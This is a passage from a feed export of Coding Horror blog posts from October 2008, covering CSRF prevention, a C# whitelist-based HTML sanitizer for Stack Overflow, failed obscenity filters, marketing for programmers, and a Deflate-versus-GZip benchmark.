<i>We discovered CSRF vulnerabilities in ING's site that allowed an attacker to open additional accounts on behalf of a user and transfer funds from a user's account to the attacker's account.</i><br>
<br>
</li>
<li>YouTube
<br><br>
<i>We discovered CSRF vulnerabilities in nearly every action a user can perform on YouTube.</i><br><br>
</li>
<li>MetaFilter
<br><br>
<i>We discovered a CSRF vulnerability in MetaFilter that allowed an attacker to take control of a user's account.</i><br><br>
</li>
<li>The New York Times
<br><br>
<i>We discovered a CSRF vulnerability in NYTimes.com that makes user email addresses available to an attacker. If you are a NYTimes.com member, abitrary sites can use this attack to determine your email address and use it to send spam or to identify you.</i><br>
</li>
</ol>
<p>
If major public facing websites are falling prey to these serious XSRF exploits, how confident do you feel that <i>you</i> haven't made the same mistakes? Consider carefully. I'm saying this as a developer who has <i>already</i> made these same mistakes on his own website. <b>I'm just as guilty as anyone.</b>
</p>
<p>
It's our job to make sure future developers don't repeat the same stupid mistakes we made -- at least not without a fight. The <a href="http://freedom-to-tinker.com/sites/default/files/csrf.pdf">Felten and Zeller paper</a> (pdf) recommends the "double-submitted cookie" method to prevent XSRF:
</p>
<p>
</p>
<blockquote>
When a user visits a site, the site should generate a (cryptographically strong) pseudorandom value and set it as a cookie on the user's machine. <b>The site should require every form submission to include this pseudorandom value as a form value and also as a cookie value.</b> When a POST request is sent to the
site, the request should only be considered valid if the form value and the cookie value are the same. When an attacker submits a form on behalf of a user, he can only modify the values of the form. An attacker cannot read any data sent from the server or modify cookie values, <a href="http://developer.mozilla.org/en/Same_origin_policy_for_JavaScript">per the same-origin policy</a>. This means that while an attacker can send any value he wants with the form, he will be unable to modify or read the value stored in the cookie. Since the cookie value and the form value must be the same, the attacker will be unable to successfully submit a form unless he is able to guess the pseudorandom value.
</blockquote>
<p>
The advantage of this approach is that it requires no server state; you simply set the cookie value once, then every HTTP POST checks to ensure that one of the submitted &lt;input&gt; values contains the exact same cookie value. Any difference between the two means a possible XSRF attack.
</p>
<p>
An even stronger, albeit more complex, prevention method is to leverage server state -- <b>to generate (and track, with timeout) a unique random key for every single HTML FORM you send down to the client.</b> We use a variant of this method on Stack Overflow with great success. That's why with every &lt;form&gt; you'll see the following:
</p>
<p>
</p>
<pre>
&lt;input id="fkey" name="fkey" type="hidden" value="df8652852f139" /&gt;
</pre>
<p>
If you want to audit a website for XSRF vulnerabilities, start by asking this simple question about every single HTML form you can find: <b>"where's the XSRF value?"</b>
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-10-14T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/preventing-csrf-and-xsrf-attacks/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Programming Is Hard, Let's Go Shopping! ]]></title>
<link>https://blog.codinghorror.com/programming-is-hard-lets-go-shopping/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>A few months ago, Dare Obasanjo noticed a brief exchange my friend <a href="http://twitter.com/jongalloway">Jon Galloway</a> and I had on Twitter. Unfortunately, Twitter makes it unusually difficult to follow conversations, but Dare outlines the gist of it in <a href="http://www.25hoursaday.com/weblog/2008/08/31/DevelopersUsingLibrariesIsNotASignOfWeakness.aspx">Developers, Using Libraries is not a Sign of Weakness</a>:</p>
<blockquote>
<p>The problem Jeff was trying to solve is <strong>how to allow a subset of HTML tags while stripping out all other HTML so as to prevent cross site scripting (XSS) attacks</strong>. The problem with Jeff's approach which was pointed out in the comments by many people including Simon Willison is that using regexes to filter HTML input in this way assumes that you will get fairly well-formed HTML. The problem with that approach which many developers have found out the hard way is that you also have to worry about malformed HTML due to the liberal HTML parsing policies of many modern Web browsers. Thus to use this approach you have to pretty much reverse engineer every HTML parsing quirk of common browsers if you don't want to end up storing HTML which looks safe but actually contains an exploit. Thus to utilize this approach Jeff really should have been looking at using a full fledged HTML parser such as SgmlReader or Beautiful Soup instead of regular expressions.</p>
<p>The sad thing is that Jeff Atwood isn't the first nor will he be the last programmer to think to himself "It's just HTML sanitization, how hard can it be?". There are many lists of <a href="http://blogs.msdn.com/hackers/archive/2007/11/12/first-line-of-defense-for-web-applications-part-4.aspx">Top HTML Validation Bloopers</a> that show tricky it is to get the right solution to this seemingly trivial problem. Additionally, it is sad to note that despite his recent experience, Jeff Atwood still argues that <strong>he'd rather make his own mistakes than blindly inherit the mistakes of others as justification for continuing to reinvent the wheel</strong> in the future. That is unfortunate given that is a bad attitude for a professional software developer to have.</p>
</blockquote>
<p>My response?</p>
<blockquote class="twitter-tweet" data-lang="en">
<p lang="en" dir="ltr"><a href="https://twitter.com/jongalloway">@jongalloway</a> you're right, coding is hard. Let's go shopping!</p>— Jeff Atwood (@codinghorror) <a href="https://twitter.com/codinghorror/status/904415232">August 31, 2008</a>
</blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>Bad attitude? I think that's a matter of perspective.</p>
<p>(The phase "programming is hard, let's go shopping!" is a snowclone. As usual, <a href="http://itre.cis.upenn.edu/~myl/languagelog/archives/002919.html">Language Log has us covered</a>. Ironically, we later had a brief run-in with Consultant Barbie "herself" on Stack Overflow – who <a href="http://www.reddit.com/r/programming/user/consultant_barbie/">you may know from reddit</a>. There's no trace of her left on SO, but as griefing goes, it was fairly benign and even arguably on-topic.)</p>
<p>In the development of <a href="http://stackoverflow.com">Stack Overflow</a>, I determined early on that <a href="https://blog.codinghorror.com/is-html-a-humane-markup-language/">we'd be using Markdown</a> for entering questions and answers in the system. Unfortunately, <strong>Markdown allows users to intermix HTML into the markup.</strong> It's <a href="http://daringfireball.net/projects/markdown/dingus">part of the spec</a> and everything. I sort of wish it wasn't, actually – one of the great attractions of pseudo-markup languages like <a href="http://www.phpbb.com/community/faq.php?mode=bbcode">BBCode</a> is that they have <em>nothing</em> in common with HTML and thus sanitizing the input becomes trivial. Users have two choices:</p>
<ul>
<li>Enter approved pseudo-markup.</li>
<li>Trick question. There is no other choice!</li>
</ul>
<p>With BBCode, if the user enters HTML you blow it away with extreme prejudice – it's encoded, without exceptions. Easy. No thinking and barely any code required.<br>
Since we use Markdown, we don't have that luxury. Like it or not, we are now in the nasty, brutish business of distinguishing "good" HTML markup from "evil" HTML markup. That's hard. Really hard. Dare and Jon are right to question the competency and maybe even the sanity of any developer who willingly decided to bite off that particular problem.</p>
<p>But here's the thing: <strong>deeply understanding HTML sanitization is a critical part of my business.</strong> Users entering markdown isn't just some little tickbox in a feature matrix for me, it is <em>quite literally the entire foundation that our website is built on.</em></p>
<p>Here's a pop quiz from way back in 2001. See how you do.</p>
<ol>
<li>Code Reuse is:<ol type="a">
<li>Good </li>
<li>Bad </li>
</ol>
</li>
<li>Reinventing the Wheel is:<ol type="a">
<li>Good </li>
<li>Bad </li>
</ol>
</li>
<li>The Not-Invented-Here Syndrome is:<ol type="a">
<li>Good </li>
<li>Bad </li>
</ol>
</li>
</ol>
<p>I'm sure most developers are practically climbing over each other in their eagerness to answer at this point. Of <em>course</em> code reuse is good. Of <em>course</em> reinventing the wheel is bad. Of <em>course</em> the not-invented-here syndrome is bad.</p>
<p>Except when it isn't.</p>
<p><a href="http://www.joelonsoftware.com/articles/fog0000000007.html">Joel Spolsky explains</a>:</p>
<blockquote>
<p><strong>If it's a core business function – do it yourself, no matter what.</strong></p>
<p>Pick your core business competencies and goals, and do those in house. If you're a software company, writing excellent code is how you're going to succeed. Go ahead and outsource the company cafeteria and the CD-ROM duplication. If you're a pharmaceutical company, write software for drug research, but don't write your own accounting package. If you're a web accounting service, write your own accounting package, but don't try to create your own magazine ads. If you have customers, never outsource customer service.</p>
</blockquote>
<p>Being a "professional" developer, if there really is such a thing – I still have my doubts – doesn't mean choosing third-party libraries for every possible programming task you encounter. Nor does it mean blindly writing everything yourself out of a misguided sense of duty or the perception that's what gonzo, hardcore programming types do. Rather, experienced developers <strong>learn what their core business functions are and write whatever software they deem necessary to perform those functions extraordinarily well.</strong></p>
<p>Do I regret spending a solid week building a set of HTML sanitization functions for Stack Overflow? Not even a <em>little</em>. There are plenty of sanitization solutions outside the .NET ecosystem, but precious few for C# or VB.NET. I've <a href="http://refactormycode.com/codes/333-sanitize-html">contributed the core code back to the community</a>, so future .NET adventurers can use our code as a guidepost (or warning sign, depending on your perspective) on their own journey. They can learn from the simple, proven routine we wrote and continue to use on Stack Overflow every day.</p>
<p>(Sadly this code outlasted the refactormycode website, so I've reprinted the final version here; consider this MIT licensed.)</p>
<pre style="max-height:400px">private static Regex _tags = new Regex("&lt;[^&gt;]*(&gt;|$)",
    RegexOptions.Singleline | RegexOptions.ExplicitCapture | RegexOptions.Compiled);
private static Regex _whitelist = new Regex(@"
    ^&lt;/?(b(lockquote)?|code|d(d|t|l|el)|em|h(1|2|3)|i|kbd|li|ol|p(re)?|s(ub|up|trong|trike)?|ul)&gt;$|
    ^&lt;(b|h)r\s?/?&gt;$",
    RegexOptions.Singleline | RegexOptions.ExplicitCapture | RegexOptions.Compiled | RegexOptions.IgnorePatternWhitespace);
private static Regex _whitelist_a = new Regex(@"
    ^&lt;a\s
    href=""(\#\d+|(https?|ftp)://[-a-z0-9+&amp;@#/%?=~_|!:,.;\(\)]+)""
    (\stitle=""[^""&lt;&gt;]+"")?\s?&gt;$|
    ^&lt;/a&gt;$",
    RegexOptions.Singleline | RegexOptions.ExplicitCapture | RegexOptions.Compiled | RegexOptions.IgnorePatternWhitespace);
private static Regex _whitelist_img = new Regex(@"
    ^&lt;img\s
    src=""https?://[-a-z0-9+&amp;@#/%?=~_|!:,.;\(\)]+""
    (\swidth=""\d{1,3}"")?
    (\sheight=""\d{1,3}"")?
    (\salt=""[^""&lt;&gt;]*"")?
    (\stitle=""[^""&lt;&gt;]*"")?
    \s?/?&gt;$",
    RegexOptions.Singleline | RegexOptions.ExplicitCapture | RegexOptions.Compiled | RegexOptions.IgnorePatternWhitespace);


/// &lt;summary&gt;
/// sanitize any potentially dangerous tags from the provided raw HTML input using 
/// a whitelist based approach, leaving the "safe" HTML tags
/// CODESNIPPET:4100A61A-1711-4366-B0B0-144D1179A937
/// &lt;/summary&gt;
public static string Sanitize(string html)
{
    if (String.IsNullOrEmpty(html)) return html;

    string tagname;
    Match tag;

    // match every HTML tag in the input
    MatchCollection tags = _tags.Matches(html);
    for (int i = tags.Count - 1; i &gt; -1; i--)
    {
        tag = tags[i];
        tagname = tag.Value.ToLowerInvariant();
        
        if(!(_whitelist.IsMatch(tagname) || _whitelist_a.IsMatch(tagname) || _whitelist_img.IsMatch(tagname)))
        {
            html = html.Remove(tag.Index, tag.Length);
            System.Diagnostics.Debug.WriteLine("tag sanitized: " + tagname);
        }
    }

    return html;
}
</pre>
<p>Honestly, I'm not that great of a developer. I'm not so much talented as competent and loud. Start writing and talking and <a href="http://www.hanselman.com/blog/ProfessionalismProgrammingAndPunditryAndSuccessAsAMetric.aspx">you can be loud, too</a>. But I'll tell you this: in choosing to fight that HTML sanitizer battle, I've <a href="https://blog.codinghorror.com/some-lessons-from-forth/">earned the scars of experience</a>. I don't have to take anybody's word for it – I don't have to trust "libraries". I can look at the code, examine the input and output, and predict exactly what kinds of problems might arise. I have a deep and profound understanding of the risks, pitfalls, and tradeoffs of HTML sanitization.. <em>and</em> cross-site scripting vulnerabilities.</p>
<img alt="image placeholder" >
<p>As <a href="http://en.wikipedia.org/wiki/Richard_Feynman">Richard Feynman</a> so famously wrote on his last blackboard, <strong>what I cannot create, I do not understand.</strong></p>
<p>This is exactly the kind of programming experience I need to keep watch over Stack Overflow, and I wouldn't trade it for anything. You may not be building a website that depends on users entering markup, so you might make a different decision than I did. But surely there's something, some core business competency, so important that <em>you feel compelled to build it yourself, even if it means making your own mistakes</em>.</p>
<p>Programming is hard. But that doesn't mean you should always go shopping for third party libraries instead of writing code. <strong>If it's a core business function, write that code yourself, <em>no matter what</em></strong>. If other programmers don't understand why it's so critically important that you sit down and write that bit of code – well, that's their problem.</p>
<p>They're probably too busy shopping to understand.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-10-16T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/programming-is-hard-lets-go-shopping/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Obscenity Filters: Bad Idea, or Incredibly Intercoursing Bad Idea? ]]></title>
<link>https://blog.codinghorror.com/obscenity-filters-bad-idea-or-incredibly-intercoursing-bad-idea/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>I'm not a huge fan of The Daily WTF for <a href="http://www.codinghorror.com/blog/archives/000824.html">reasons I've previously outlined</a>. There is, however, the occasional gem – such as <a href="http://forums.thedailywtf.com/forums/t/5552.aspx">this one</a> posted by ezrec:</p>
<blockquote>
<p>Browsing through a web archive of some old computer club conversations, I ran across this sentence:</p>
<p>"Apple made the clbuttic mistake of forcing out their visionary - I mean, look at what NeXT has been up to!"</p>
<p>Hmm. "clbuttic".</p>
<p><a href="http://www.google.com/search?q=clbuttic">Google "clbuttic"</a> - thousands of hits!</p>
<p>There's a someone who call his car 'clbuttic'.</p>
<p>There are "Clbuttic Steam Engine" message boards.</p>
<p>Webster's dictionary - no help.</p>
<p>Hmm. What can this be?</p>
</blockquote>
<p>As programmers, this isn't much of a mystery to us; it seems <strong>every day a brand new software developer is born and immediately begins repeating all the same mistakes we made years ago</strong>. I can't resist <a href="http://languagelog.ldc.upenn.edu/nll/?p=556">linking to Language Log again on this topic</a>, where a commenter disputes whether or not this is an actual real world problem:</p>
<blockquote>
<p>The "clbuttics" story may be a little exaggerated if not actually a web-legend. Sure, Google returns 4,000 hits – but by the time one reaches page 2 (in search of a page that isn't reporting on the silliness, or reporting on the reports, etc.) we're down to 200 hits.</p>
<p>Almost all of those 200 seem to have a "clbuttic mistake" by Apple at their core. Google's redundancy-compacting routines are only invoked when requested, it seems, and even then, the variety of information in 200 hits may be small.</p>
<p>In short, it's an echo chamber. 200 or 4,000 or however many hits today aren't as impressive as the same number last year, etc. All the more so as web sites of all kinds put randomly chosen (even Googled!) words out there just to game Google.</p>
</blockquote>
<p>While I agree this particular manifestation of the mistake is probably over-reported (because, haha, butts are funny) and fairly rare on the open web, I still get this shiner on page one of my search results:</p>
<p><a href="http://www.bluegrassworld.com/music/Is-the-song-Dueling-Banjos-considered-blue-grbutt.html">Is the song Dueling Banjos considered blue grbutt?</a></p>
<p>Poor Bluegrass World. I'm pretty sure that site is legitimate, though I have no idea how they'd post an article in that state. Obligatory link to <a href="http://www.youtube.com/watch?v=NFutge4xn3w">dueling banjos scene from Deliverance</a>. I'm inclined to believe this is, in fact, still a problem. There are many, many examples besides "clbuttic" out there. Perhaps you've heard of the <a href="http://www.google.com/search?hl=en&amp;q=consbreastution">United States Consbreastution?</a></p>
<p>Of course, what we have here is <strong>failed obscenity filters implemented by (extremely) newbie developers</strong> with regular expressions. I could explain, but as they say, a picture is worth a thousand words, particularly when it's a picture of my very bestest friend, <a href="http://www.regexbuddy.com/cgi-bin/affref.pl?aff=jatwood">RegexBuddy</a>:</p>
<p><a href="http://www.regexbuddy.com/cgi-bin/affref.pl?aff=jatwood"><img alt="image placeholder" >
<p>Oh, great, an inexperienced developer had a problem, and thought they would use regular expressions. Now <a href="http://www.codinghorror.com/blog/archives/001016.html">they have two problems</a>. Well, technically through Google they now have many thousands of problems, but who's counting.</p>
<p>I'm not sure regular expressions are to blame here. The replacement is so mind-bendingly naive that it might as well have been a simple <code>Replace</code> operation. We, being extra-smart-gets-things-done developers, would write a <em>superior</em> regular expression using the <strong><code>b</code></strong> word boundary qualifier around the replacement, and use some capturing parens to handle both the singular and plural cases.</p>
<p><a href="http://www.regexbuddy.com/cgi-bin/affref.pl?aff=jatwood"><img alt="image placeholder" >
<p>How about those <a href="http://en.wikipedia.org/wiki/Great_Tit">Great Tits</a>, eh?</p>
<p>Proving, yet again, that bad ideas are just plain <em>bad ideas</em>, regardless of language or implementation choices. <strong>Obscenity filters are like blacklists; using one is tantamount to <a href="http://www.codinghorror.com/blog/archives/001009.html">admitting failure before you've even started</a></strong>.</p>
<p>But it still happens all the time. One of the most famous incidents was when the Yahoo! email developers <a href="http://en.wikipedia.org/wiki/Medireview">created the accidental non-word Medireview</a>. They weren't trying to filter obscenities, but JavaScript webmail exploits.</p>
<blockquote>In 2001 Yahoo! silently introduced an email filter which changed some strings in HTML emails considered to be dangerous. While it was intended to stop spreading JavaScript viruses, <strong>no attempts were made to limit these string replacements to script sections and attributes</strong>, out of fear this would leave some loophole open. Additionally, word boundaries were not respected in the replacement.
<p>The list of replacements:</p>
<table cellspacing="4">
<tbody>
<tr>
<td>Javascript</td>
<td>→</td>
<td>java-script</td>
</tr>
<tr>
<td>Jscript</td>
<td>→</td>
<td>j-script</td>
</tr>
<tr>
<td>Vbscript</td>
<td>→</td>
<td>vb-script</td>
</tr>
<tr>
<td>Livescript</td>
<td>→</td>
<td>live-script</td>
</tr>
<tr>
<td>Eval</td>
<td>→</td>
<td>review</td>
</tr>
<tr>
<td>Mocha</td>
<td>→</td>
<td>espresso</td>
</tr>
<tr>
<td>Expression</td>
<td>→</td>
<td>statement</td>
</tr>
</tbody>
</table>
</blockquote>
<p>Some side-effects of this implementation:</p>
<table cellspacing="4">
<tbody>
<tr>
<td>medieval</td>
<td>→</td>
<td>medireview</td>
</tr>
<tr>
<td>evaluation</td>
<td>→</td>
<td>reviewuation</td>
</tr>
<tr>
<td>expressionist</td>
<td>→</td>
<td>statementist</td>
</tr>
</tbody>
</table>
<p><a href="http://medireview.com/">medireview.com</a> is currently  occupied by domain squatters. Perhaps that's a fitting end for this "company", though I perversely almost want the company to exist, as wholly formed from our imaginations, sort of <a href="http://www.codinghorror.com/blog/archives/000996.html">like Jamcracker</a>.</p>
<p>I can't help wondering just how freaked out the brass at Yahoo must have been about then-new JavaScript browser exploits to actually <em>deploy</em> such a brain-damaged "solution". To be fair, it was seven years ago, but still – did it not occur to anyone that such broad replacement criteria might have some serious side-effects? Or that replacing one thing with another, when it comes to human beings and written language, is an activity that is fraught with peril even in the best possible circumstances?</p>
<p>Obscenity filtering is an enduring, maybe even timeless problem. <strong>I'm doubtful it will ever be possible to solve this particular problem through code alone.</strong> But it seems some companies and developers can't stop tilting at that windmill. Which means you might want to think twice before you <a href="http://en.wikipedia.org/wiki/Scunthorpe_Problem">move to Scunthorpe</a>.</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-10-20T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/obscenity-filters-bad-idea-or-incredibly-intercoursing-bad-idea/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ The One Thing Every Software Engineer Should Know ]]></title>
<link>https://blog.codinghorror.com/the-one-thing-every-software-engineer-should-know/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
I'm a huge <a href="http://steve-yegge.blogspot.com/">Steve Yegge</a> fan, so It was a great honor to have Steve Yegge on a <a href="http://blog.stackoverflow.com/2008/10/podcast-25/">recent Stack Overflow podcast</a>. One thing I couldn't have predicted, however, was one particular theme of Steve's experience at Google and Amazon that kept coming up time and time again:
</p>
<p>
</p>
<blockquote>
If there was one thing I could teach every engineer, it would be <b>how to market</b>.
</blockquote>
<p>
Not <a href="http://steve-yegge.blogspot.com/2008/09/programmings-dirtiest-little-secret.html">how to type</a>, not <a href="http://steve.yegge.googlepages.com/you-should-write-blogs">how to write</a>, not <a href="http://steve-yegge.blogspot.com/2008/06/rhinos-and-tigers.html">how to design a programming language</a>, but <i>marketing</i>.
</p>
<p>
This is painful for developers to hear, because <a href="http://www.codinghorror.com/blog/archives/000878.html">we love code</a>. But all that brilliant code is totally irrelevant until:
</p>
<p>
</p>
<ol>
<li>people <b>understand</b> what you're doing
</li>
<li>people become <b>interested</b> in what you're doing
</li>
<li>people get <b>excited</b> about what you're doing
</li>
</ol>
<p>
That, in a nutshell, is marketing. Just because you're a marketer doesn't <i>necessarily</i> mean you're a marketing weasel. Sure, the two things are highly correlated -- but at its core, marketing is little more than an intermediate level course on fundamental human communication. Not something us programmers have <a href="http://www.codinghorror.com/blog/archives/000710.html">historically been so great at</a>.
</p>
<p>
That's why even the hardest of hard-core programmers should be paying attention to people like <a href="http://www.amazon.com/gp/redirect.html?ie=UTF8&amp;location=%2Fgp%2Fsearch%3Fy%3D14%26field-keywords%3Dseth%20godin%26url%3Dsearch-alias%3Dstripbooks%26ref%5F%3Dnb%5Fss%5F%26x%3D14&amp;tag=codihorr-20&amp;linkCode=ur2&amp;camp=1789&amp;creative=390957">Seth Godin</a>. Steve was referring to marketing in the broader, more timeless sense of <b>getting other people interested in your ideas</b>.
</p>
<p>
After hearing Steve mention this several times on our podcast -- and having seen his related talk <a href="http://blip.tv/file/319044/">How to Ignore Marketing and Become Irrelevant in Two Easy Steps</a> I suddenly realized why I was so fascinated with two particular books I recently discovered. Books I kept referring to, over and over, during the development of Stack Overflow.
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4" width="650">
<tr>
<td valign="bottom">
<a href="http://www.amazon.com/dp/1591841216/?tag=codihorr-20">Whatever You Think, Think the Opposite</a>
</td>
<td valign="bottom">
<a href="http://www.amazon.com/dp/0714843377/?tag=codihorr-20">It's Not How Good You Are,<br>It's How Good You Want to Be</a>
</td>
</tr>
<tr>
<td valign="top">
<a href="http://www.amazon.com/dp/1591841216/?tag=codihorr-20"><img alt="image placeholder" >
</td>
<td valign="top">
<a href="http://www.amazon.com/dp/0714843377/?tag=codihorr-20"><img alt="image placeholder" >
</td>
</tr>
</table>
<p>
I couldn't put down these two small-format books from the late <a href="http://en.wikipedia.org/wiki/Paul_Arden">Paul Arden</a>. Guess what Mr. Arden did for a living? That's right, he was an executive creative director for Saatchi &amp; Saatchi -- an advertising firm.
</p>
<p>
I had been reading dirty books. <i>Marketing</i> books. By choice, even. I'm a bit embarrassed to admit this, because these are exactly the kinds of pithy little business books I usually make fun of other people for reading. But in reading these books, I realized that so much of what we do on Stack Overflow has nothing to do with how awesome our code is -- and everything to do with <i>marketing</i>.
</p>
<p>
We're all software developers here, so let me put this in terms programmers understand: <a href="http://en.wikipedia.org/wiki/Dungeons_and_Dragons">Dungeons &amp; Dragons</a> character statistics. You know, the classics.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
If you're a programmer, and you want to <a href="http://www.codinghorror.com/blog/archives/000530.html">get better at your job every year</a>, you might think that the most important character stat to build is <i>coding</i>. Let's call this INT. So at the end of many years of toil, you'll end up something like this:
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4">
<tr>
<td>str</td>
<td>6</td>
</tr>
<tr>
<td>dex</td>
<td>9</td>
</tr>
<tr>
<td>con</td>
<td>12</td>
</tr>
<tr>
<td>int</td>
<td><font color="red">51</font></td>
</tr>
<tr>
<td>wis</td>
<td>13</td>
</tr>
<tr>
<td>chr</td>
<td>4</td>
</tr>
</table>
<p>
OK, you're a genius programmer who can code circles around everyone else. But <a href="http://www.codinghorror.com/blog/archives/000773.html">you may never ship any of your code</a> for reasons that you don't control. That's an illusion. You <i>can</i> control when, how, and where your code ships. You probably spent too much time building your code and <b>not enough time as an <i>advocate</i> of your code</b>. Did you explain to people what your code does, why it's cool and important? Did you offer reasons why your code is going to make their lives better, at least in some small way? Did you make it easy for people to find and use your code?
</p>
<p>
I believe most programmers will be better served in their professional career if they shoot for character development more along these lines:
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4">
<tr>
<td>str</td>
<td>16</td>
</tr>
<tr>
<td>dex</td>
<td>14</td>
</tr>
<tr>
<td>con</td>
<td>15</td>
</tr>
<tr>
<td>int</td>
<td>18</td>
</tr>
<tr>
<td>wis</td>
<td>16</td>
</tr>
<tr>
<td>chr</td>
<td>17</td>
</tr>
</table>
<p>
Sometimes, <a href="http://www.codinghorror.com/blog/archives/000543.html">you become a better programmer by choosing not to program</a>. I agree with Steve: if I could teach my fellow software engineers one thing, it would be <b>how to market themselves, their code, and their project.</b>
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-10-22T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/the-one-thing-every-software-engineer-should-know/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ You're Reading The World's Most Dangerous Programming Blog ]]></title>
<link>https://blog.codinghorror.com/youre-reading-the-worlds-most-dangerous-programming-blog/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Have you ever noticed that <b>blogs are full of misinformation and lies?</b> In particular, I'm referring to <i>this</i> blog. The one you're reading right now. For example, <a href="http://www.codinghorror.com/blog/archives/001177.html">yesterday's post</a> was so bad that it is <a href="http://www.reddit.com/r/programming/comments/78vq3/jeff_atwood_finally_jumps_the_shark/">conclusive proof that I've jumped the shark</a>.
</p>
<p>
Again.
</p>
<p>
Apparently, according to one Reddit commenter, the information presented here is downright <i>dangerous</i>:
</p>
<p>
</p>
<blockquote>
<b>Jeff Atwood has always held the distinction of having the most dangerous programming blog</b>, in that some young or aspiring developers may actually listen to some of his "advice", but now he's somehow managed to snag the achievement of having the most inane programming blog as well.
<p>
To put it in more frank terms Jeff: What you've just written is one of the most insanely idiotic things I have ever heard. At no point in your rambling, incoherent response were you even close to anything that could be considered a rational thought. Everyone in this room is now dumber for having read this post. I award you no points, and may God have mercy on your soul.
</p>
</blockquote>
<p>
I enjoyed the <a href="http://www.imdb.com/title/tt0112508/">Billy Madison</a> quote, but I'm not sure my blog has earned that particular distinction yet. If <i>this</i> blog is the most dangerous content that young, inexperienced developers have ever read then, well, I'd have to seriously question whether or not they've ever actually used this thing we call the "world wide web".
</p>
<p>
Allow me to illustrate with an example.
</p>
<p>
Today I happened across <a href="http://blog.madskristensen.dk/post/Compression-and-performance-GZip-vs-Deflate.aspx">this blog entry from Mads Kristensen</a>. In it, Mads explains that <a href="http://en.wikipedia.org/wiki/DEFLATE">Deflate</a> is faster than <a href="http://en.wikipedia.org/wiki/Gzip">GZip</a>.
</p>
<p>
</p>
<blockquote>
First I tested the <code>GZipStream</code> and then the <code>DeflateStream</code>. I expected a minor difference because the two compression methods are different, but the result astonished me. <b>I measured the DeflateStream to be 41% faster than GZip</b>. That's a very big difference. With this knowledge, I'll have to change the HTTP compression module to choose Deflate over GZip.
</blockquote>
<p>
This was a surprising result to me, because the two compression algorithms are very closely related. On the other hand, we use GZip extensively and heavily to cache HTML fragment output strings on the Stack Overflow server, <a href="http://www.hanselman.com/blog/TheWeeklySourceCode35ZipCompressingASPNETSessionAndCacheState.aspx">as Scott Hanselman explains</a>. If Deflate really is that much faster, we need to switch to it!
</p>
<p>
But, like any veteran internet user, I never take what I read on a blog -- or any other site on the internet, for that matter -- as fact. Rather, it's a germ of an intriguing idea, a call to action. I fired up my IDE and built a small test harness to test for myself: <b>is <code>Deflate</code> faster than <code>GZip</code>?</b>
</p>
<p>
</p>
<pre>
public static class StopwatchExtensions
{
public static long Time(this Stopwatch sw, Action action, int iterations)
{
sw.Reset();
sw.Start();
for (int i = 0; i &lt; iterations; i++) { action(); }
sw.Stop();
return sw.ElapsedMilliseconds;
}
}
class Program
{
static void Main(string[] args)
{
string s = File.ReadAllText(@"c:test.html");
byte[] b;
var sw = new Stopwatch();
b = CompressGzip(s);
Console.WriteLine("gzip size: " + b.Length);
Console.WriteLine(sw.Time(() =&gt; CompressGzip(s), 1000));
Console.WriteLine(sw.Time(() =&gt; DecompressGzip(b), 1000));
b = CompressDeflate(s);
Console.WriteLine("deflate size: " + b.Length);
Console.WriteLine(sw.Time(() =&gt; CompressDeflate(s), 1000));
Console.WriteLine(sw.Time(() =&gt; DecompressDeflate(b), 1000));
}
}
</pre>
<p>
The results were surprising: on my box, <b>GZip is just as fast as Deflate.</b> For giant strings, for medium strings, for small strings. In every possible testing combination I can think of, Deflate is nowhere near 40% faster.
</p>
<p>
</p>
<pre>
gzip size: 3125
242
171
deflate size: 3107
225
149
</pre>
<p>
That's not exactly what Mads' blog entry tells me should happen. Do I think Mads is an idiot for posting this? Well, no. I don't.
</p>
<p>
</p>
<ul>
<li>The original blog entry was posted in late 2006; since then new versions of the .NET framework have shipped and hardware has gotten faster. Perhaps there was some significant change in either that produces this different outcome.
</li>
<li>My test is a bit different than Mads' testing. I use a random HTML file as the compression target; I can't tell exactly what he's compressing in his benchmark. I also tried with small, medium, and large strings. The tests are similar, but they're not the same.
</li>
</ul>
<p>
Is this the type of dangerous misinformation that blogs are vilified for? Should I be angry at Mads for posting this? Not at all. I learned a bit more about Deflate and GZip. It provided an opportunity for me to refactor my compression code some. I even <a href="http://stackoverflow.com/questions/232848/wrapping-stopwatch-timing-with-a-delegate-or-lambda">learned how to benchmark using lambda syntax</a>. If I hadn't read this post, if it hadn't provided that impetus of an idea for me to ponder, I wouldn't have bothered.
</p>
<p>
I am a better programmer for having read that blog post. Even though, near as I can tell, it's offering inaccurate advice.
</p>
<p>
<font color="red">Update</font>: I got a bit more curious about this, so I ran some more tests on different machines. Here are the results, in milliseconds, for a thousand runs each using the Google homepage HTML as the target (it's about 7 Kb):
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
How much faster <i>is</i> Deflate than GZip?
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4">
<tr>
<td></td>
<td>Core 2 Duo<br>3.5 Ghz</td>
<td>Core 2 Quad<br>1.86 Ghz</td>
<td>Athlon X2<br>2.1 Ghz</td>
</tr>
<tr>
<td>Compress</td>
<td>8% faster</td>
<td>8% faster</td>
<td>50% faster</td>
</tr>
<tr>
<td>Decompress</td>
<td>15% faster</td>
<td>17% faster</td>
<td>37% faster</td>
</tr>
</table>
<p>
